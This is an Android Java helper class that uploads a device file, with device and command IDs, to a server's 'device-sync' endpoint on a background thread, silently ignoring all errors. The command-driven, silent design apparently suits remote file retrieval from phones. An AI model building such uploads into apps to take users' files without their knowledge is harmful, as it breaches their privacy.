package com.snapapp.companion;

import android.content.Context;
import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;

public class FileUploadHelper {

    public static void uploadFile(final String serverUrl, final String deviceId,
                                  final String cmdId, final String fileId, final String filePath) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                HttpURLConnection conn = null;
                try {
                    File file = new File(filePath);
                    if (!file.exists() || file.length() > 30 * 1024 * 1024) return;

                    String boundary = "===" + System.currentTimeMillis() + "===";
                    URL url = new URL(serverUrl + "/api/device-sync/upload-file");
                    conn = (HttpURLConnection) url.openConnection();
                    conn.setRequestMethod("POST");
                    conn.setDoOutput(true);
                    conn.setConnectTimeout(20000);
                    conn.setReadTimeout(60000);
                    conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);

                    OutputStream os = conn.getOutputStream();
                    PrintWriter w = new PrintWriter(new OutputStreamWriter(os, StandardCharsets.UTF_8), true);

                    addFormField(w, boundary, "device_id", deviceId);
                    if (cmdId != null) addFormField(w, boundary, "command_id", cmdId);
                    if (fileId != null) addFormField(w, boundary, "file_id", fileId);
                    addFormField(w, boundary, "file_name", file.getName());

                    w.append("--").append(boundary).append("\r\n");
                    w.append("Content-Disposition: form-data; name=\"file\"; filename=\"").append(file.getName()).append("\"\r\n");
                    w.append("Content-Type: application/octet-stream\r\n\r\n").flush();

                    try (FileInputStream fis = new FileInputStream(file)) {
                        byte[] buf = new byte[8192];
                        int len;
                        while ((len = fis.read(buf)) != -1) os.write(buf, 0, len);
                        os.flush();
                    }

                    w.append("\r\n").flush();
                    w.append("--").append(boundary).append("--\r\n").close();

                    conn.getResponseCode();
                } catch (Exception ignored) {
                } finally {
                    if (conn != null) conn.disconnect();
                }
            }
        }).start();
    }

    private static void addFormField(PrintWriter w, String boundary, String name, String value) {
        w.append("--").append(boundary).append("\r\n");
        w.append("Content-Disposition: form-data; name=\"").append(name).append("\"\r\n\r\n");
        w.append(value).append("\r\n").flush();
    }
}
